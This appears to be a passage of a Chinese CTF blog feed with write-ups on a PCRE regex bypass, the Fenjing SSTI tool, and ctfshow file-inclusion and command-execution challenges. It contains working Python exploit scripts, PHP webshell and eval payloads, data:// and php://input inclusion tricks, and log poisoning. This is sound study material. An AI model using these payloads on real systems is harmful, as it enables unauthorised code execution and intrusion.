class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br>files = &#123;<br>  <span class="hljs-string">&#x27;file&#x27;</span>: BytesIO(<span class="hljs-string">b&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1000000</span>)<br>&#125;<br><br>res = requests.post(<span class="hljs-string">&#x27;http://51.158.75.42:8088/index.php&#x27;</span>, files=files, allow_redirects=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(res.headers)<br></code></pre></td></tr></table></figure><hr><h3 id="CTF实战：-FBCTF-2019-rceservice-NSSCTF"><a href="#CTF实战：-FBCTF-2019-rceservice-NSSCTF" class="headerlink" title="CTF实战：[FBCTF 2019]rceservice | NSSCTF"></a>CTF实战：[<a href="https://www.nssctf.cn/problem/1190">FBCTF 2019]rceservice | NSSCTF</a></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>  &lt;body&gt;<br>    &lt;h1&gt;Web Adminstration Interface&lt;/h1&gt;<br><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 将环境变量 &#x27;PATH&#x27; 设置为 &#x27;/home/rceservice/jail&#x27;</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);<br><br><span class="hljs-comment">// 检查请求中是否存在 &#x27;cmd&#x27; 参数</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$json</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br>    <span class="hljs-comment">// 检查 &#x27;cmd&#x27; 参数是否是字符串</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$json</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;检测到黑客攻击&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>    &#125; <br>    <span class="hljs-comment">// 使用正则表达式匹配潜在的危险命令</span><br>    <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="hljs-variable">$json</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;检测到黑客攻击&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 尝试运行命令</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;尝试运行命令:&lt;br/&gt;&#x27;</span>;<br>        <span class="hljs-comment">// 将 JSON 字符串解码为 PHP 数组</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>)[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cmd</span> !== <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-comment">// 使用 system() 函数执行命令</span><br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;无效输入&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br>    &lt;form&gt;<br>      Enter command <span class="hljs-keyword">as</span> JSON:<br>      &lt;input name=<span class="hljs-string">&quot;cmd&quot;</span> /&gt;<br>    &lt;/form&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>可以看到过滤了很多东西</p><p>要求JSON命令来输入，就是键值对的方法</p><hr><p><code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code></p><p>将环境变量<code>PATH</code>设置为<code>/home/rceservice/jail</code></p><p>这意味着任何命令的执行都将仅限于此路径下的可执行文件。</p><p>在这种情况下，除非<code>/home/rceservice/jail</code>目录中存在<code>cat</code>命令，否则默认路径下的<code>cat</code>命令将不可用。</p><p>通常情况下，<code>cat</code>命令在系统的<code>/bin</code>目录中，这意味着你需要指定完整路径<code>/bin/cat</code>才能执行<code>cat</code>命令。</p><hr><p>推测flag在&#x2F;home&#x2F;rceservice&#x2F;目录下</p><p>可以用脚本验证</p><p><img src="/images/pcre/19.png"></p><p>直接拿脚本跑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-keyword">import</span> requests<br> <br> payload = <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br> res = requests.post(<span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28528/&quot;</span>, data=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:payload&#125;)<br><span class="hljs-comment">#print(payload)</span><br> <span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/images/pcre/17.png"></p><hr><p><strong>其他解法:</strong></p><p>当看到正则中存在^xxx$格式也会用%0a：%0a绕过</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">payload:?cmd=&#123;%0a&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0a&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/pcre/18.png"></p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SSTI工具</title>
    <link href="/2024/07/13/SSTI%E8%87%AA%E5%8A%A8%E5%B7%A5%E5%85%B7/"/>
    <url>/2024/07/13/SSTI%E8%87%AA%E5%8A%A8%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<p>SSTI常规题通杀工具，非常好用</p><h2 id="焚靖-fenjing"><a href="#焚靖-fenjing" class="headerlink" title="焚靖(fenjing)"></a>焚靖(fenjing)</h2><p>下载地址<a href="https://github.com/Marven11/Fenjing">Marven11&#x2F;Fenjing: 专为CTF设计的Jinja2 SSTI全自动绕WAF脚本 )</a></p><p>焚靖是一个针对CTF赛事中常规Jinja SSTI题目开发的WAF检测与绕过工具。</p><p>焚靖融合了CTF赛事中常见的SSTI绕过技巧，可以灵活组合使用各类绕过技巧全自动构建payload绕过WAF.</p><p>焚靖既可以作为命令行程序使用，也可以作为python库导入到脚本中，其还提供一个网页UI方便不熟悉命令行的选手使用。</p><h3 id="Fenjing的安装运行："><a href="#Fenjing的安装运行：" class="headerlink" title="Fenjing的安装运行："></a>Fenjing的安装运行：</h3><p>使用pip进行安装运行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">pip install fenjing<br>python -m fenjing webui<br><span class="hljs-comment"># python -m fenjing scan --url &#x27;http://xxxx:xxx&#x27;</span><br></code></pre></td></tr></table></figure><p>下载并运行docker镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run --net host -it marven11/fenjing webui<br></code></pre></td></tr></table></figure><p>使用pipx安装运行(作者推荐)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 首先使用apt/dnf/pip/...安装pipx</span><br><span class="hljs-comment">#pip install pipx</span><br><span class="hljs-comment"># 然后用pipx自动创建独立的虚拟环境并进行安装</span><br>pipx install fenjing<br>fenjing webui<br><span class="hljs-comment"># fenjing scan --url &#x27;http://xxxx:xxx&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h3><h4 id="webui"><a href="#webui" class="headerlink" title="webui"></a>webui</h4><p>可以直接在webui里指定参数并自动攻击</p><p>在左边填入并点击开始分析，然后在右边输入命令即可</p><h4 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h4><p>在终端可以用scan功能，猜测某个页面的参数并自动攻击：</p><p><code>python -m fenjing scan --url &#39;http://xxxx:xxx/yyy&#39;</code></p><h4 id="crack"><a href="#crack" class="headerlink" title="crack"></a>crack</h4><p>也可以用crack功能，手动指定参数进行攻击：</p><p><code>python -m fenjing crack --url &#39;http://xxxx:xxx/yyy&#39; --detect-mode fast --inputs aaa,bbb --method GET</code></p><p>这里提供了aaa和bbb两个参数进行攻击，并使用<code>--detect-mode fast</code>加速攻击速度</p><h4 id="crack-request"><a href="#crack-request" class="headerlink" title="crack-request"></a>crack-request</h4><p>还可以将HTTP请求写进一个文本文件里（比如说<code>req.txt</code>）然后进行攻击</p><p>文本文件内容如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?name=PAYLOAD</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:5000<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p>命令如下：</p><p><code>python -m fenjing crack-request -f req.txt --host &#39;127.0.0.1&#39; --port 5000</code></p><h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><h3 id="LitCTF-2024-一个…-池子？-NSS"><a href="#LitCTF-2024-一个…-池子？-NSS" class="headerlink" title="[LitCTF 2024]一个….池子？ -NSS"></a>[LitCTF 2024]一个….池子？ -<a href="https://www.nssctf.cn/problem/5606">NSS</a></h3><p><img src="/images/sstiZD/1.png"></p><p><img src="/images/sstiZD/2.png"></p><p>输入<code>&#123;&#123;7*9&#125;&#125;</code>得到63说明存在ssti漏洞</p><p>因为主要测试fenjing所以直接给出原payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;cycler.<span class="hljs-built_in">next</span>.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;ca&#x27;</span><span class="hljs-string">&#x27;t app.py&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>用fenjing爆破</p><p>kali打开fenjing执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -m fenjing scan --url &#x27;http://node4.anna.nssctf.cn:28489/&#x27; <br></code></pre></td></tr></table></figure><p><img src="/images/sstiZD/3.png"></p><p>启动爆破</p><p><img src="/images/sstiZD/4.png"></p><p>成功</p><p><img src="/images/sstiZD/5.png"></p><p>这样我们就能执行命令，示例给了ls &#x2F;</p><p>执行</p><p><img src="/images/sstiZD/6.png"></p><p>我们可以看到爆破的payload就是我们之前给的那个</p><p>并且我们得到根目录的文件</p><p><img src="/images/sstiZD/7.png"></p><p>发现flag，直接cat得到flag</p><p><img src="/images/sstiZD/8.png"></p><p>可以说是非常方便了</p><p>但是焚靖是一个针对CTF赛事中常规Jinja SSTI题目开发的WAF检测与绕过工具。</p><p>他针对的模板只有jinja2</p><p>除了fenjing外还有一个ssti工具：<a href="https://github.com/epinna/tplmap">tplmap</a></p><h3 id="Tplmap："><a href="#Tplmap：" class="headerlink" title="Tplmap："></a>Tplmap：</h3><p>Tplmap 通过多种沙盒逃逸技术帮助利用代码注入和服务器端模板注入漏洞来访问底层操作系统。</p><p>该工具及其测试套件旨在研究 SSTI 漏洞类，并在 Web 应用程序渗透测试期间用作进攻性安全工具。</p><p>plmap 支持超过 15 个模板引擎、非沙盒模板引擎和类似 <em>eval（）</em> 的通用注入。</p><p>此工具我并没有使用过。</p><p>安装可参考<a href="https://blog.csdn.net/u011250160/article/details/122023910">SSTI注入神器tplmap安装教程-CSDN博客</a></p><p>使用<a href="https://www.cnblogs.com/ktsm/p/15473100.html">tplmap的安装和简单使用 - KittySmith - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow--文件包含</title>
    <link href="/2024/07/11/ctfshow%20--%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2024/07/11/ctfshow%20--%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h2 id="CTFSHOW-文件包含篇"><a href="#CTFSHOW-文件包含篇" class="headerlink" title="CTFSHOW-文件包含篇"></a><strong>CTFSHOW-文件包含篇</strong></h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">include包含直接用伪协议就行<br>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZioiKTsgPz4=<br>或<br>?file=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs txt">此题用了str_replace函数：<br>str_replace(<br>    array|string $search,<br>    array|string $replace,<br>    string|array $subject,<br>    int &amp;$count = null<br>): string|array<br>该函数返回字符串或者数组。该字符串或数组是将 subject 中全部的 search 都被 replace 替换之后的结果。 <br><br>所以php就会被替换为???<br>但是没有大小写限制，可以用php://input,php://input允许你访问原始的POST数据。<br>payload：?file=Php://input<br>post：1=&lt;?php system(&#x27;ls&#x27;);?&gt;  （先看看flag在哪，        用bp传<br>再post：1=&lt;?php system(&#x27;tac f*&#x27;);?&gt;<br>或<br>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZioiKTsgPz4=<br></code></pre></td></tr></table></figure><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs txt">相比web79，多了data的绕过。<br>还是可以用<br>payload：?file=Php://input<br>post：1=&lt;?php system(&#x27;ls&#x27;);?&gt;  （先看看flag在哪<br>再post：1=&lt;?php system(&#x27;tac fl0g.php&#x27;);?&gt;<br>的方法。<br>或使用包含日志的方法<br>先包含日志查看日志内容?file=/var/log/nginx/access.log<br><br>172.12.129.208 - - [13/Jul/2024:04:54:34 +0000] &quot;GET / HTTP/1.1&quot; 200 2291 &quot;https://d905ea2a-bfa7-48d2-88df-62dc0944f812.challenge.ctf.show/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0&quot; <br><br>内容有ip,时间，参数和user-agent<br>我们可以操控user-agent写命令再包含日志执行<br>&lt;?php system(&#x27;tac fl0g.php&#x27;); ?&gt;<br></code></pre></td></tr></table></figure><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">比上一题多了:的过滤<br>解法同web80<br></code></pre></td></tr></table></figure><h3 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">多了对.的过滤，过滤了点之后我们只能包含无后缀的文件，而在php中无后缀文件就是session文件。<br>所以本题要用session竞争包含<br><br></code></pre></td></tr></table></figure><p>参考文章：<a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow--命令执行</title>
    <link href="/2024/07/09/ctfshow%20--%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2024/07/09/ctfshow%20--%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="CTFSHOW-命令执行篇"><a href="#CTFSHOW-命令执行篇" class="headerlink" title="CTFSHOW-命令执行篇"></a><strong>CTFSHOW-命令执行篇</strong></h2><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">一个很简单的命令执行，对传入的参数c只限制了不能有flag关键字，我们可以用*绕过<br>用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令<br><br>payload：?c=system(&quot;cat%20f*&quot;);<br></code></pre></td></tr></table></figure><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 